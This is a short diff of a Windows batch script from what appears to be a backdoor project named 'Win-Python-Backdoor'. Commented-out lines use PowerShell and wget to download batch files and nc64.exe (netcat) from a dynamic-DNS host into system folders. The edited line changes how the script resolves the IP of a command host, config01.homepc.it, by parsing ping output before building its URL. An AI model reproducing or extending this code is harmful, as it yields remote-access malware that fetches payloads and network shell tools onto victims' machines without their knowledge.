@@ -33,7 +33,7 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %temp%\win.bat
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/get.bat','%windir%\get.bat')
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/nc64.exe','%windir%\nc64.exe')
-for /f "tokens=1,2 delims=[]" %%A in ('ping config01.homepc.it ^| find "Pinging"') do set ipaddress=%%B
+for /f "tokens=1,2 delims=[]" %%A in ('ping config01.homepc.it ^| find "config01.homepc.it"') do set ipaddress=%%B
 echo IP address is: %ipaddress%
 
 set url=http://%ipaddress%
